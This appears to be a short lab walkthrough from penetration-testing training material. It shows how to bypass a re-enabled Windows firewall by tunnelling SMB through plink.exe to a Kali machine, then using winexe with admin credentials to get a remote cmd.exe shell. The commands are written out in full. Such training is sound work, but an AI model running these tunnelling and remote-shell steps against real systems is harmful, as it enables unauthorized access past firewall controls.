1.First, test that we can still login remotely via winexe:

winexe -U 'admin%password123'
//192.168.1.22 cmd.exe


2.Using an administrator command prompt, re-enable the firewall:
> netsh advfirewall set allprofiles state on


3.Confirm that the winexe command now fails.

4.Copy the plink.exe file across to Windows, and then kill the SMB
Server on Kali (if you are using it).

5.Make sure that the SSH server on Kali is running and accepting root logins.
Check that the “PermitRootLogin yes” option is uncommented in /etc/ssh/sshd_config.

Restart the SSH service if necessary.

6.On Windows, use plink.exe to forward port 445 on Kali to the Windows port 445:

> plink.exe root@192.168.1.11 -R 445:127.0.0.1:445


7.On Kali, modify the winexe command to point to localhost (or 127.0.0.1) instead,
and execute it to get a shell via the port forward:

winexe -U 'admin%password123' //localhost cmd.exe
